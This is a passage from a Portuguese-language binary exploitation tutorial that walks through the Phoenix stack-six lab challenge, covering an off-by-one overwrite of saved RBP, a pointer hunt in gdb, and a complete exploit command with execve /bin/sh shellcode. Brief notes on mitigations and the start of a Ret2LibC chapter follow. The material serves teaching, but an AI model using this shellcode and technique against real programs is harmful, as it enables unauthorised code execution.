mov    rax,QWORD PTR [rbp-0x8]      ; Lembra daquele pointer que salvamos com o rax de getenv() ? 
                                    ; Coloca ele em rax de novo :D

mov    rdi,rax                      ; 1º argumento: rax (o valor da env ExploitEducation)
call   0x4006fd &lt;greet&gt;             ; Chama greet()
   
mov    rdi,rax                      ; 1º argumento: O valor que greet retornou (salvo em rax)
call   0x400530 &lt;puts@plt&gt;          ; Printa a mensagem de boas vindas para o terminal
   
   
mov    eax,0x0                      ; Valor retornado por main: 0 (sem erro)
leave                               ; Epilogo
ret    
</code></pre>
<p>Não é tão relevante analisar o assembly de greet para entender a vulnerabilidade, dado que temos o código fonte!</p>
<p>Mas caso queira, você pode analisar por conta própria e relacionar o ASM com o código fonte por treino :D</p>
<a class="header" href="print.html#fuzz-1" id="fuzz-1"><h2>Fuzz</h2></a>
<p>Agora que sabemos que é possível realizar o overflow, vamos ver o que é corrompido :D</p>
<p>Nos só podemos colocar 127 no bytes no input, pois se colocarmos mais o programa simplesmente vai remove-los: então <strong>colocar 127 ou 200 teria o mesmo efeito!</strong> :)</p>
<p>Primeiro, vamos encontrar aonde colocaremos nossos breakpoints</p>
<pre><code class="language-x86asm">gef&gt; disassemble greet 
Dump of assembler code for function greet:
   0x00000000004006fd &lt;+0&gt;:	push   rbp
   0x00000000004006fe &lt;+1&gt;:	mov    rbp,rsp		&lt;---
   0x0000000000400701 &lt;+4&gt;:	push   rbx
   0x0000000000400702 &lt;+5&gt;:	sub    rsp,0xa8
.......
.......
   0x0000000000400798 &lt;+155&gt;:	pop    rbx
   0x0000000000400799 &lt;+156&gt;:	pop    rbp		&lt;---
   0x000000000040079a &lt;+157&gt;:	ret    
End of assembler dump
</code></pre>
<p>Vamos colocar uma no inicio de greet e uma no final! :D</p>
<pre><code class="language-x86asm">gef&gt; b *0x4006fe 
Breakpoint 1 at 0x4006fe

gef&gt; b *0x40079a
Breakpoint 2 at 0x40079a
</code></pre>
<a class="header" href="print.html#e-vamos-rodar-com-127-as" id="e-vamos-rodar-com-127-as"><h2>E vamos rodar com 127 As:</h2></a>
<p>Obs:</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=$(python -c &quot;print 'A' * 127&quot;)</p>
</blockquote>
<p>Deve ria funcionar, mas não funciona sei la por que :(</p>
<p>Então eu rodei em outro terminal!</p>
<blockquote>
<p>python -c &quot;print 'A' * 127&quot;</p>
</blockquote>
<p>E dei Ctrl+shift+C Ctrl+shift+V</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
</blockquote>
<p>eita, overflow no tutorial XD ! O computador ta se revoltando!!</p>
<p>Agora, vamos rodar o programa <code>r</code>. Quando ele chegar no <code>breakpoint 1</code> (inicio de greet), pode <code>analisar o frame</code> e ver <code>aonde o rbp de main foi salvo</code>!</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe590:
 rip = 0x4006fe in greet; saved rip = 0x4007e9
 called by frame at 0x7fffffffe5c0
 Arglist at 0x7fffffffe580, args: 
 Locals at 0x7fffffffe580, Previous frame's sp is 0x7fffffffe590
 Saved registers:
  rbp at 0x7fffffffe580, rip at 0x7fffffffe588                            &lt;- aqui
</code></pre>
<p>Agora que nos sabemos o endereço de RIP e RBP, podemos checar seu valores:</p>
<pre><code class="language-x86asm">endereço: valor

gef&gt; x/xg 0x7fffffffe580            -&gt; rbp
0x7fffffffe580:	0x00007fffffffe5b0
gef&gt; x/xg 0x7fffffffe588            -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<blockquote>
<p>Obs: o /xg é só para a formatação ficar legível! Significa e<strong>X</strong>tra <strong>G</strong>rande (que é o tamanho do pointer na arquitetura amd64)!</p>
</blockquote>
<p>Isso quer dizer que no inicio de greet, os valores do RIP e RBP salvos na stack são: <code>0x00000000004007e9</code> e <code>0x00007fffffffe5b0</code></p>
<p>Agora vamos continuar a execução <code>c</code>, e ver se eles se alteram (lembrando greet é vulnerável)!</p>
<pre><code class="language-x86asm">gef&gt; c
---- output do gef ----
gef&gt; x/xg 0x7fffffffe580             -&gt; rbp
0x7fffffffe580:	0x00007fffffffe541
gef&gt; x/xg 0x7fffffffe588             -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<p>Eita! RBP foi alterado D:</p>
<blockquote>
<p>0x00007fffffffe5<strong>b0</strong> ---&gt;  0x00007fffffffe5<strong>41</strong></p>
</blockquote>
<p>Isso quer dizer que nós conseguimos controlar o últimos byte do rbp salvo! Esse ultimo byte constuma ser
chamado de <code>LSB</code> (Least Significant Byte, Byte menos significante)</p>
<p>Assim, quer dizer que esse buffer overflow é um <code>BoF</code> que corrompe o <code>LSB</code>, ou como é mais conhecido: <strong>off-by-one</strong> (errado por um)!</p>
<p>Esse tipo de buffer overflow é bem comum: vão esquecer de que o buffer termina com um <code>0x00</code> e vão comparar o <code>input</code> com o <code>tamanho do buffer</code>,
ao eves do <code>tamanho do buffer - 1</code>. Assim, permitindo que seja escrito 1 byte fora do buffer!</p>
<a class="header" href="print.html#curiosidade" id="curiosidade"><h4>Curiosidade</h4></a>
<p>Lembra que o texto no inicio do buffer varia de arquitetura para arquitetura? Isso acontece pois cada uma aloca as variáveis em uma posição,
otimizam de maneira diferente, etcetc!</p>
<p>Muitas vezes um <strong>off-by-one</strong> não vai ser exploitavel, pois o byte que vem logo depois do buffer não necessariamente é o rbp!
E esse é o nosso caso: existem outras variáveis dentro de greet!</p>
<p>Assim, quem desenvolveu o desafio nos fez o favor de colocar essa mensagem no inicio para compensar esse espaço!</p>
<p>Caso a mensagem fosse 1 byte maior, poderíamos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, não conseguiríamos controlar o rbp!</p>
<p>E caso a mensagem fosse 4 bytes a mais, como você pode imaginar, poderíamos controlar o RIP :D</p>
<p>...</p>
<p>E caso o programa nem cheque o input? Ai facilita bastante pra gente hehe :D ! É o caso do desafio passado!</p>
<p>Assim, esse desafio foi feito de uma maneira que vá nos ensinar como exploitar um <strong>off-by-one</strong> que nos da <strong>execução de código</strong></p>
<p>Na vida real, caso não existisse essa mensagem, só conseguiríamos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp,
isto é: não existe nenhuma outra variável, ou o buffer foi alocado na parte mais baixa da stack(Do lado do RBP)!</p>
<pre><code>Nesse caso, nós nao conseguiríamos alterar RBP nem RIP,
portanto seria impossível conseguir execução de código :(

O máximo que conseguimos fazer é corromper 1 byte de uma variável!
._ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _  _ .
|    buffer      |   outras variáveis     | RBP | RIP | 
|_ _ _ _ _ _ _ _ |_ _ _ _ _ _ _ _ _ _ _ _ |_ _ _|_ _ _|

O impacto disso varia muito: não acontecer nada (mais comum), 
fazer o programa crashar, ou alterar um valor importante 
(por exemplo, aquela variável poderia armazenar o seu saldo do banco hehe ;) )...
</code></pre>
<a class="header" href="print.html#como-ir-de-off-by-one-para-execução-de-código" id="como-ir-de-off-by-one-para-execução-de-código"><h2>Como ir de off-by-one para execução de código</h2></a>
<p>Quando <code>main</code> chama <code>call greet</code>, ela <code>salva o seu rbp e rip</code> na stack!</p>
<p>Então esse rbp que estamos alterando é o <code>rbp de main</code>!</p>
<p>Quando greet retorna, main fica com o rbp errado!</p>
<p>Main vai ir ate o final da sua execução normalmente, na sua ultima instrução (<code>ret</code>) a magica acontece</p>
<a class="header" href="print.html#ret-com-um-rbp-corrompido" id="ret-com-um-rbp-corrompido"><h3>Ret com um RBP corrompido</h3></a>
<p>resumindo, ret é um: <code>mov rsp rbp</code> (descer o rsp), <code>pop rbp</code> (desce o rsp 8 bytes (a stack diminui para valores maiores, então +8)), e <code>pop rip</code></p>
<p>Assim, caso mudemos o rbp para, por exemplo: 0x1234<strong>56</strong>, quando main retornar, o valor de 0x1234<strong>56</strong> vai para o rbp e o de 0x1234<strong>64</strong> (+8) para o rip</p>
<p>Portanto, precisamos achar um valor para colocar no rip que va apontar para código que controlamos, e apontar rbp para esse endereço <strong>-</strong> 8 :D</p>
<p>Então caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do <code>rbp</code>: vamos colocar 0x123456<strong>70</strong> (-8) no <code>rbp</code>!
E quando main retornar, o <code>valor salvo</code> em 0x123456<strong>78</strong> vai para o <code>rip</code> !</p>
<p>E se nos controlamos RIP, controlamos a execução :D</p>
<a class="header" href="print.html#-exploit-3" id="-exploit-3"><h1>🔥 Exploit</h1></a>
<p>Agora que sabemos o tipo de exploit que precisamos escrever, basta seguir os passos a seguir:</p>
<ol>
<li>Descobrir que partes da memoria controlamos</li>
<li>Encontrar para que região podemos apontar rbp</li>
<li>Encontrar um pointer nessa região que aponte para a parte que controlamos</li>
</ol>
<a class="header" href="print.html#o-que-controlamos" id="o-que-controlamos"><h2>O que controlamos?</h2></a>
<p>Normalmente, nos controlamos o input e as env vars, nesse caso o input é passado pelas env vars... portanto podemos falar que a unica região da memoria que
controlamos são as env vars</p>
<p>E qual é essa região? Vamos encontrar :D</p>
<a class="header" href="print.html#setup" id="setup"><h3>Setup</h3></a>
<p>As envs são diferentes dentro do gdb, nós podemos comparar usando</p>
<pre><code>Fora do gdb: env
Dentro do dbg: show environment
</code></pre>
<p>A diferença é: gdb adiciona <code>LINES</code> e <code>COLUMNS</code>. E altera <code>_</code> (o programa sendo executando nesse momento, esta definido como &quot;/usr/local/bin/gdb&quot;)</p>
<pre><code class="language-diff">user@phoenix-amd64$ diff /tmp/gdb /tmp/env
16,18c16
&lt; _=/usr/local/bin/gdb
&lt; LINES=33
&lt; COLUMNS=168
---
&gt; _=/usr/bin/env
</code></pre>
<p>Para concertar essa diferença, e garantir que todos endereços estão certos, basta executar dentro do gdb:</p>
<pre><code>unset environment COLUMNS
unset environment LINES
set environment _=/opt/phoenix/amd64/stack-six

&gt; Aviso: Se você sair do gdb elas vão resetar!
</code></pre>
<a class="header" href="print.html#descobrir-que-partes-da-memoria-controlamos" id="descobrir-que-partes-da-memoria-controlamos"><h3>Descobrir que partes da memoria controlamos</h3></a>
<p>Colocando um breakpoint no inicio de main (<code>b *main</code>), vamos encontrar registers apontando para envs!
<img src="./img/stack_six/envs_gef.png" alt="" /></p>
<p>Escolhendo o menor endereço e printando!</p>
<p><img src="./img/stack_six/envs_addr.png" alt="" /></p>
<blockquote>
<p>Dica: vale a pena conferir se aquele realmente é o inicio das envs, no nosso caso é :D</p>
</blockquote>
<p><img src="./img/stack_six/envs_addr2.png" alt="" /></p>
<p>Isso quer dizer que as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<a class="header" href="print.html#encontrar-para-que-região-podemos-apontar-rbp" id="encontrar-para-que-região-podemos-apontar-rbp"><h3>Encontrar para que região podemos apontar rbp</h3></a>
<p>Nesse caso é fácil ne? Se nós só podemos alterar o LSB, podemos alterar o RBP: de 0x00007fffffffe5<strong>00</strong> (inclusivo) a 0x00007fffffffe5<strong>ff</strong> (inclusivo)</p>
<a class="header" href="print.html#encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos" id="encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos"><h3>Encontrar um pointer nessa região que aponte para a parte que controlamos</h3></a>
<p>Agora vamos usar uma utilidade do gef chamada <code>memwatch</code>! Sempre que o gef printar aquele output gigante, vai adicionar a região da memoria especificada!
Voce vai estar &quot;assistindo&quot; aquela região da memoria! :D</p>
<p>Nos vamos executar <code>gef&gt; memory watch 0x00007fffffffe500 32 qword</code></p>
<blockquote>
<p>Uma qword são 8 bytes, assim, 32 qwords são 256 bytes</p>
</blockquote>
<p>Agora, vamos ver quando main retorna, o que tem nessa região</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
Dump of assembler code for function main:
....
   0x00000000004007f6 &lt;+91&gt;:	leave  
   0x00000000004007f7 &lt;+92&gt;:	ret

gef&gt; b *0x00000000004007f7
</code></pre>
<p>Agora basta executar o programa ate chegar la (obs, se voce ainda ta naquele breakpoint de main, basta continuar (<code>c</code>))</p>
<p><img src="./img/stack_six/memwatch.png" alt="memwatch" /></p>
<p>Eita, bastante coisa!</p>
<p>Agora, entre esses endereços, precisamos encontrar um que tenha um <strong>pointer que aponte para a região da memoria que controlamos!</strong></p>
<p>Pra facilitar isso, eu vou jogar todo o output do <code>memwatch</code> em um arquivo e usar <code>grep</code></p>
<p>Todos os endereços da região que controlamos começam com <code>0x7fffffff</code>, então esse ja é um bom começo</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffff&quot;
0x00007fffffffe500│+0x0000 0x0000000000000001
0x00007fffffffe508│+0x0008 0x00007ffff7db6d0f
0x00007fffffffe510│+0x0010 0x00007ffff7ffc948
0x00007fffffffe518│+0x0018 0x00000000000000a6
0x00007fffffffe520│+0x0020 0x00007fffffffe57f
0x00007fffffffe528│+0x0028 0x0000000000000001
0x00007fffffffe530│+0x0030 0x4141414141414141
0x00007fffffffe538│+0x0038 0x00007ffff7ffb300
0x00007fffffffe540│+0x0040 0x0000000000000000
0x00007fffffffe548│+0x0048 0x0000000000600c00
0x00007fffffffe550│+0x0050 0x000000000040079b
0x00007fffffffe558│+0x0058 0x0000000000000000
...
...
...
</code></pre>
<p>Isso reduz bastante, mas ainda não o suficiente: a gente precisa de <code>0x00007fffffff</code> no valor, e não no endereço</p>
<p>Para isso, podemos usar cut! Usando cut antes do grep nos estamos só levando os valores em consideração! Para facilitar, também podemos deixa-los em ordem crescente (sort)!</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | cut -d &quot; &quot; -f 2 | grep &quot;0x00007fffffff&quot; | sort
0x00007fffffffe541
0x00007fffffffe57f
0x00007fffffffe620
0x00007fffffffe628
0x00007fffffffe638
0x00007fffffffef10
</code></pre>
<p>as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<p>O único valor valido é <strong>0x00007fffffffef10</strong>, pois todos os outros são menores que 0x00007fffffff<strong>e817</strong> !</p>
<p>Agora, basta achar o endereço desse pointer! Portanto vamos tirar o cut :D</p>
<pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffffef10&quot;                     
0x00007fffffffe5c8│+0x00c8 0x00007fffffffef10
</code></pre>
<p>Porem, ainda tem um detalhe! Nos não queremos esse endereço no rbp! Nos queremos ele no rip!</p>
<p>Assim, nos vamos apontar RBP para o item de cima da lista! Ai quando main retornar (<code>pop rip</code>) o valor vai ser o correto!</p>
<p><img src="./img/stack_six/addr_rbp.png" alt="" /></p>
<p>Lembrando que, quando uma função retorna, o endereço 8 bytes maior que rbp, é onde o rip esta! Então por definir <code>rbp = 0x00007fffffffe5c0</code>, nos
estamos definindo <code>rip = 0x00007fffffffe5c8</code> então nos temos <code>RIP -&gt; 0x00007fffffffe5c8 -&gt; 0x00007fffffffef10 -&gt; env vars</code></p>
<p>E você talvez voce esteja se perguntando, pra qual env var que RIP ta apontando?</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffef10
0x7fffffffef10:	'A' &lt;repeats 127 times&gt;
</code></pre>
<p>Por sorte, justamente o inicio do nosso buffer! Então não precisa nem de NOP sled ate o shellcode</p>
<pre><code>Se você quer continuar sozinhx, agora é sua hora de brilhar!
Dica: O valor que precisamos colocar no rbp salvo, por meio do overflow é: c0
Eu recomendo vc tentar encontrar ele por conta própria pois
pode variar de acordo com o seu computador (explicação em breve) :D
.
.
.
.
.
.
.
</code></pre>
<a class="header" href="print.html#shellcode-1" id="shellcode-1"><h2>Shellcode</h2></a>
<p>Então o nosso exploit vai ficar: <code>shellcode+AAAAAAAAAAAA+c0</code></p>
<p>Para testar isso, vou usar o truque do <code>0xcc</code>:</p>
<pre><code class="language-x86asm">$ export ExploitEducation=$(python -c &quot;print '\xcc' + 125 * 'A' + '\xc0'&quot;)
$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
Trace/breakpoint trap
</code></pre>
<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela</p>
<p>Isso quer dizer que conseguimos execução de código! lembrando que isso é muito frágil: uma alteração nas envs e o exploit quebra!</p>
<p>Nos podemos usar técnicas como encontrar um pointer que esta numa localização fixa usando <code>ROPgadgets</code>, ou um <code>NOP sled</code>!</p>
<p>Porem, nesse desafio vamos focar em só fazer ele funcionar! Caso vc queira, pode aplicar as técnicas ensinadas previamente para tornar o exploit melhor!</p>
<hr />
<p><strong>Obs</strong></p>
<p>Mas por exemplo, caso executemos <code>./stack-six</code> ao invés de <code>/opt/phoenix/amd64/stack-six</code>, o exploit não funciona :(</p>
<pre><code class="language-x86asm">$ ./stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
Segmentation fault
</code></pre>
<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferença é causada pela env <code>LS_COLORS</code>
(uma variável <strong>gigantesca</strong> que lista as cores do terminal!</p>
<p>Caso você utilize um terminal mais moderno (com emojis por exemplo) para entrar via ssh, pode haver uma diferença!</p>
<p>Mas você esta equipadx com o conhecimento para conseguir resolver e encontrar o valor correto, caso tenha mudado! :D</p>
<hr />
<p>Agora, vamos usar um shellcode de verdade! Até achar um que funciona é tentativa e erro! Eu recomendo você procurar aqui: <a href="http://shell-storm.org/shellcode/">shell-storm</a></p>
<p>Para mim, <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">shellcode-806</a> costuma funcionar muito bem, e dessa vez funcionou perfeitamente! :D</p>
<p>Mas claro, você pode brincar com todos aqueles shellcodes: alterar a senha, criar um arquivo, ... o ceu é o limite! Ou talvez nem o ceu... ja que esse esse é um tutorial sobre quebrar limites hehehe :D</p>
<blockquote>
<p>AVISO: Esse tutorial é sobre quebrar o limite de buffers! Não tente quebrar o ceu, pois pode resultar em acidentes, quedas, ou as pessoas rirem de você socando o ar!</p>
</blockquote>
<p>Mas bem, piadas sem graça a parte, o exploit ficou assim: SHELLCODE+99 * A+c0</p>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que é a mesma hehe :D</p>
<p>Ou caso você prefira tudo em um só comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<p>Lembrando que a quantidade de As deve ser alterada para que <code>c0 seja o byte 127 (shellcode + AAAAAA + c0 = 127)</code></p>
<p>Nesse caso, o shellcode tem 27 bytes: <code>27 + 99 As + 1 byte (c0) = 127</code></p>
<p>Caso seu shellcode seja maior, basta reduzir os As respectivamente!</p>
<hr />
<p>Finalmente! terminamos a parte da stack uhuuu</p>
<p>Esse stack-six foi beeeeem complicadinho! Então parabéns por ter chegado ate aqui! :D</p>
<a class="header" href="print.html#-solução-6" id="-solução-6"><h1>💫 Solução</h1></a>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que é a mesma hehe :D</p>
<p>Ou caso você prefira tudo em um só comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<ul>
<li><a href="print.html#dep--nx--wx">DEP | NX | W^X</a></li>
<li><a href="print.html#system-aslr">System ASLR</a></li>
<li><a href="print.html#pie">PIE</a></li>
<li><a href="print.html#relro">RELRO</a>
<ul>
<li><a href="print.html#parcial">Parcial</a></li>
<li><a href="print.html#full">Full</a></li>
<li><a href="print.html#fontes-e-recursos-adicionais">Fontes e Recursos Adicionais</a></li>
</ul>
</li>
<li><a href="print.html#canaries">Canaries</a></li>
<li><a href="print.html#outras">Outras</a>
<ul>
<li><a href="print.html#linux">Linux</a>
<ul>
<li><a href="print.html#pointer-guard">Pointer Guard</a></li>
</ul>
</li>
<li><a href="print.html#windows">Windows</a></li>
</ul>
</li>
</ul>
<a class="header" href="print.html#dep--nx--wx" id="dep--nx--wx"><h1>DEP | NX | W^X</h1></a>
<p>Todas essas pretendem impedir a execução de código em
partes da memoria que sejam &quot;escreviveis&quot;.</p>
<p>Impedir que x atacante execute o código escrito
pelx mesmx, previne que Shellcodes sejam usados! :D</p>
<p>Assim, ou uma parte da memoria ou pode ser escrita, ou
executável, mas nunca as duas simultaneamente:
<strong>W</strong>rite <strong>XOR(^)</strong> e<strong>X</strong>ecute</p>
<p>Você vai ouvir pessoas usando os 3 nomes para representar
esse conceito, e dependendo do contexto não tem problema!</p>
<p>Porem eles são tecnicamente diferentes:</p>
<p><strong>DEP</strong> (<strong>P</strong>revencao da <strong>E</strong>xecucao de <strong>D</strong>ados):
a implementação do <strong>Windows</strong></p>
<p><strong>N</strong>ao e<strong>X</strong>ecute: um bit que pode ser colocado para
garantir a exclusão mutua em processadores <strong>AMD</strong>.</p>
<p>Intel tem um outro nome, que eu não lembro...
e não importa o suficiente para eu pesquisar! :P</p>
<blockquote>
<p>Atualmente, a exclusão mutua de escrever e executar
ocorre por meio de paging: o sistema operacional decide
as permissões das paginas de memorias, e garante que uma
não viole W^X . <strong>No momento que você esta lendo, isso
pode ter mudado!</strong></p>
</blockquote>
<a class="header" href="print.html#system-aslr" id="system-aslr"><h1>System ASLR</h1></a>
<p>ASLR randomiza os endereços das coisas na memoria! Porem
com as suas limitações, dado que depende doo sistema
operacional!</p>
<p>Cada OS implementa de um jeito, mas em geral se randomiza:</p>
<ul>
<li>Imports dinamicos (LIBC,...)</li>
<li>Segmentos do executável (Data, ROData, ...)</li>
<li>Stack e Heap</li>
</ul>
<p><strong>Porem, o endereço do código não muda!</strong></p>
<a class="header" href="print.html#pie" id="pie"><h1>PIE</h1></a>
<p>Para garantir que o código também tenha sua posição
randomizada, o binário precisa ser compilado com PIE !</p>
<p>PIE (<strong>E</strong>xecucao <strong>I</strong>ndependente da <strong>P</strong>osição) impede
que o codigo possa ser executado independente da sua<br />
posição na memoria (duh :P)</p>
<p>Para garantir isso, todos endereços precisam ser relativos ao invés de absolutos!</p>
<pre><code>            Endereço	Instrução
Sem PIE     0x0001	jmp 0x0003 &lt;- EIP	
            0x0002	add 1 2
            0x0003	add 1 3

Com PIE     ------	jmp EIP+2  &lt;- EIP
            ------	add 1 2
            ------	add 1 3
</code></pre>
<p>No primeiro caso, se o executável mudar de endereço
o <code>JMP</code> pularia para a instrução errada, por causa do
endereço absoluto.</p>
<a class="header" href="print.html#relro" id="relro"><h1>RELRO</h1></a>
<p>Realocacoes Read-only: Dividido em 2 tipos: Parcial e Full</p>
<p>Atualmente, somente o RELRO Parcial vem como padrao no gcc</p>
<ul>
<li>PARCIAL: <code>gcc -Wl,-z,relro</code> ou nenhuma flag, em versoes modernas</li>
<li>FULL: <code>gcc -Wl,-z,relro,-z,now</code></li>
</ul>
<a class="header" href="print.html#parcial" id="parcial"><h2>Parcial</h2></a>
<ul>
<li>As <code>sections</code> de dados do ELF (<code>got</code>,<code>dtors</code>,<code>ctors</code>) precedem as do programa
(<code>data</code>,<code>bss</code>). Assim, caso tenha um BoF no programa a estrutura do ELF fica
intacta.</li>
</ul>
<a class="header" href="print.html#full" id="full"><h2>Full</h2></a>
<ul>
<li>Tudo do parcial</li>
<li>Re-Mapeia a GOT como <code>r--</code>, impedindo que a usemos para ganhar execucao.</li>
</ul>
<p>Porem para fazer isso torna-se nescessario pre-resolver todas as calls
dinamicas. Assim. desativando <code>RTLD_LAZY</code> e consequentemente tornando a
inicializacao mais lenta.</p>
<p>Da nossa perspectiva, ficamos com opcoes reduzidas para execucao de codigo,
tendo de usar tecnicas como corromper os <code>malloc hooks</code> ou o <code>vtable</code> pointer
do <code>stdio</code>. (mais sobre esses no futuro!)</p>
<a class="header" href="print.html#fontes-e-recursos-adicionais" id="fontes-e-recursos-adicionais"><h2>Fontes e Recursos Adicionais</h2></a>
<ul>
<li><a href="https://www.trapkit.de/articles/relro/">trapkit: RELRO A (not so well known) Exploit Mitigation Technique</a></li>
<li><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/em386/Self-Protecting-GOT.html">Self Protecting GOT</a></li>
</ul>
<hr />
<p>TODO</p>
<hr />
<a class="header" href="print.html#canaries" id="canaries"><h1>Canaries</h1></a>
<a class="header" href="print.html#outras" id="outras"><h1>Outras</h1></a>
<a class="header" href="print.html#linux" id="linux"><h2>Linux</h2></a>
<a class="header" href="print.html#pointer-guard" id="pointer-guard"><h3>Pointer Guard</h3></a>
<a class="header" href="print.html#windows" id="windows"><h2>Windows</h2></a>
<ul>
<li><a href="print.html#ret2libc">Ret2LibC</a></li>
<li><a href="print.html#fun%C3%A7%C3%B5es-%C3%BAteis">Funções Úteis</a>
<ul>
<li><a href="print.html#system">System()</a>
<ul>
<li><a href="print.html#conseguindo-o-pointer-para-binsh">Conseguindo o pointer para /bin/sh</a></li>
<li><a href="print.html#layout-da-stack-numa-call-32-bits">Layout da stack numa call 32 bits</a></li>
<li><a href="print.html#unindo-tudo">Unindo tudo</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#pontos-fracos">Pontos Fracos</a>
<ul>
<li><a href="print.html#estaticamente-linkado">Estaticamente Linkado</a></li>
<li><a href="print.html#dinamicamente-linkado--aslr">Dinamicamente Linkado (+ ASLR)</a></li>
</ul>
</li>
<li><a href="print.html#fun%C3%A7%C3%B5es-uteis-pt-2">Funções Uteis Pt 2</a>
<ul>
<li><a href="print.html#execve--exit">Execve() + Exit()</a></li>
<li><a href="print.html#mprotect--ret2shellcode">Mprotect() + ret2shellcode</a>
<ul>
<li><a href="print.html#argumentos">Argumentos</a>
<ul>
<li><a href="print.html#addr">Addr</a></li>
<li><a href="print.html#size">Size</a></li>
<li><a href="print.html#perms">Perms</a></li>
</ul>
</li>
<li><a href="print.html#classifica%C3%A7%C3%A3o">Classificação</a></li>
<li><a href="print.html#analise">Analise</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<a class="header" href="print.html#ret2libc" id="ret2libc"><h1>Ret2LibC</h1></a>
<p>Ret2Libc foi uma técnica desenvolvida para combater W^X. Alem disso,
ter domínio dessa técnica facilitar a compreensão de ROP. :D</p>
<p>Por nao podermos colocar o shellcode na stack (ou heap), precisamos
encontrar outra maneira de conseguir uma shell... Assim, vamos precisar
encontrar uma parte executável na memoria! Uma função do próprio programa!</p>
<p>Voce se lembra de quando chamávamos uma <code>call_me()</code> ou <code>win()</code> nos desafios
iniciais? Então... poderíamos fazer isso... mas ninguém colocaria uma
